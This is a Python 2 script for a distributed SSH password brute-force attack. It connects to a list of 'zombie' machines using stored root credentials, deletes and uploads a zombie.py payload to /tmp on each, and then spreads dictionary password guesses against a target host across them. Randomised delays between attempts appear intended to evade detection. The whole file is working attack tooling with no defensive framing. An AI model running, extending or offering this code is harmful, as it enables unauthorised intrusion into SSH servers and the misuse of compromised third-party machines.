#!/usr/bin/env python
# -*- coding: utf-8 -*-

import optparse
import time
import random
import paramiko
import hashlib
from threading import*

conn_no = 5
conn_lock = Semaphore(value=conn_no)
Found = False
Fails = 0
waitime = 5


def get_zombie(zombie_file):
    zombie_list = []
    fp = open(zombie_file,'r')
    
    for line in fp.readlines():
        zombie_list.append(line.strip('\r').strip('\n'))
    return zombie_list

def zombie_scp(s,local_file,remote_file):
    s.exec_command("rm -rf " + remote_file)
    sftp = paramiko.SFTPClient.from_transport(s.get_transport())
    sftp = s.open_sftp()
    sftp.put(local_file, remote_file)

def update_zombie_script(zombie_list):
    local_file = "zombie.py"
    remote_file = "/tmp/zombie.py"
    count = 0
    for zombie_info in zombie_list:
        try:
            zmb_host = zombie_info.split(':',2)[0]
            zmb_user = zombie_info.split(':',2)[1]
            zmb_pwd = zombie_info.split(':',2)[2]
        
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(zmb_host, 22, zmb_user, zmb_pwd)
            zombie_scp(ssh,local_file,remote_file)
            ssh.close()
            count += 1
        except Exception, e:
            print "Zombie(" +zmb_host+") connection failed!" + str(e)
            del zombie_list[count]
            pass

def zombie_work(s, host, port, user, password):
    global Found
    #ssh
    payload = "cd /tmp; /usr/bin/python2.7 zombie.py -H "+ host +" -u " + user + " -P " + password + " -p "+ port
    stdin, stdout, stderr = s.exec_command(payload)
    
    if hashlib.md5("Found SSH Password").hexdigest() in stdout.read():
        Found = True
        print '[+] Exiting: Found SSH Password --> ' + password
        exit(0)
    
def conduct_zombie(host, port, user, password, zombie, release):

    zmb_host = zombie.split(':',2)[0]
    zmb_user = zombie.split(':',2)[1]
    zmb_pwd = zombie.split(':',2)[2]
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(zmb_host, 22, zmb_user, zmb_pwd)
        zombie_work(ssh, host, port, user, password)
        ssh.close()
        
    except Exception, e:
        print "Zombie(" +zmb_host+") connection failed!" + str(e)
        pass
    finally:
        time.sleep(random.uniform(waitime, waitime * 2))
        conn_lock.release()

def main():
    global conn_lock
    global waitime
    
    parser = optparse.OptionParser('usage % prog -H <target host> -p <target_port> ' +\
                                   '-u <user> -F <password-list -Z <zombie_file>' +\
                                   '-T <type> -l <threads> -c <interval>' )
    parser.add_option('-H', '--host', dest = 'target_host', type = 'string', help = 'Host IP of target.')
    parser.add_option('-p', '--port', dest = 'target_port', default = '22', help = 'Port to connect to on the target.')
    parser.add_option('-u', '--username', dest = 'user', type = 'string', help = 'Provide username when connect to the target. ')
    parser.add_option('-F', '--passwdfile', dest = 'passwd_file', type = 'string', help = 'Dictionary of passwords.')
    parser.add_option('-Z', '--zombiefile', dest = 'zombie_file', type = 'string', help = 'Provide zombie\'s resource. Format: 192.168.0.1:root:toor.')
    parser.add_option('-T', '--srv_type', dest = 'service_type', type = 'string' , default = '6' , help = 'Only support SSH service this version.')
    parser.add_option('-l', '--threads', dest = 'conn_num', type = 'string', help = 'Run threads number of connects in parallel. default 5.')
    parser.add_option('-c', '--interval', dest = 'waitime', type = 'string', help = 'Defines the minimum wait time in seconds, default 5s. \
                      DBF use random time interval technology. The actual time interval is 5.0~10.0 seconds.')
    
    (options,args) = parser.parse_args()
    host = options.target_host
    user = options.user
    port = options.target_port
    service_type = options.service_type
    passwd_file = options.passwd_file
    zombie_file = options.zombie_file
    conn_num = options.conn_num
    
    if(conn_num):
        conn_lock = Semaphore(value=int(conn_num))
    if(options.waitime):
        waitime = float(options.waitime)
    if host == None or user == None or passwd_file == None or zombie_file == None:
        print parser.usage
        exit(0)
    
    fp = open(passwd_file,'r')
    zombie_list = get_zombie(zombie_file)
    zombie_total = len(zombie_list)
    update_zombie_script(zombie_list)
    zombie_available = len(zombie_list)
    print "Total %d \nAvailable %d\n" %(zombie_total,zombie_available)
    
    count = 0
    for password in fp.readlines():
        if Found == True:
            exit(0)
        count += 1
        if not count%10:
            print "Count: %d" %count
        
        zombie = zombie_list[count%zombie_available]
        password = password.strip('\r').strip('\n')
        
        conn_lock.acquire()
        t = Thread(target = conduct_zombie, args = (host, port, user, password, zombie, True))
        child = t.start()
    print "Count total:%d \n Complete!" %count
if __name__ == '__main__':
    main()
